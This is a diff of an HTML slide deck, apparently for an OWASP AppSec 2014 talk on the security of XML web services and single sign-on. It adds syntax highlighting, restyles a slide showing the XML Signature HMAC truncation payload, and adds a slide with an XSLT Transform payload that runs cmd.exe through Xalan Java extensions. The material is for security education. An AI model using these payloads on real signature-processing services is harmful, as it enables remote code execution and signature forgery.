@@ -5,10 +5,17 @@
     <meta name="viewport" content="width=1024" />
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <title>OWASP AppSec 2014</title>
-
+	<script type="text/javascript" src="js/shCore.js"></script>
+	<script type="text/javascript" src="js/shBrushXml.js"></script>
     <link href="http://fonts.googleapis.com/css?family=Open+Sans:regular,semibold,italic,italicsemibold|PT+Sans:400,700,400italic,700italic|PT+Serif:400,700,400italic,700italic" rel="stylesheet" />
-
     <link href="css/impress-demo.css" rel="stylesheet" />
+	<link type="text/css" rel="stylesheet" href="css/shCore.css"/>
+	<link type="text/css" rel="stylesheet" href="css/shThemeDefault.css"/>
+	<script type="text/javascript">
+		SyntaxHighlighter.all();
+	</script>
+
+
 </head>
 
 <body class="impress-not-supported">
@@ -153,7 +160,7 @@
 		<hr>
 		<h2>XML Signature</h2>
 		<p>HMAC Truncation Attack</p>
-		<pre style="font-size:65%">
+		<pre class="brush: xml; class-name: 'sixty-percent-text'">
 		&lt;SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#hmac-sha1"&gt;
 			&lt;HMACOutputLength&gt;1&lt;/HMACOutputLength&gt;
 		&lt;/SignatureMethod&gt;
@@ -162,6 +169,29 @@
     </div>
 	
 	<div class="step slide" data-x="1000" data-y="2500">
+        <h3>Security of XML-based Web Services and Single Sign-On</h3>
+		<hr>
+		<h2>XSLT Code Execution</h2>
+		<p>Det er selvfølgelig muligheter for litt remote code execution her også</p>
+		<pre class="brush: xml; class-name: 'sixty-percent-text'">
+			&lt;Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116"&gt;
+			&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
+				xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" 
+				xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object" 
+				exclude-result-prefixes= "rt,ob"&gt; 
+				&lt;xsl:template match="/"&gt; 
+				&lt;xsl:variable name="runtimeObject" select="rt:getRuntime()"/&gt; 
+				&lt;xsl:variable name=“command" select="rt:exec( 
+				$runtimeObject,&apos;c:\Windows\system32\cmd.exe&apos;)"/&gt; 
+				&lt;xsl:variable name="commandAsString" select="ob:toString($command)"/&gt; 
+				&lt;xsl:value-of select="$commandAsString"/&gt; 
+				&lt;/xsl:template&gt; 
+			&lt;/xsl:stylesheet&gt; 
+			&lt;/Transform&gt;
+		</pre>
+	</div>
+	
+	<div class="step slide" data-x="1000" data-y="3300">
         <h3>Security of XML-based Web Services and Single Sign-On</h3>
 		<hr>
 		<h2>WS-Attacker</h2>
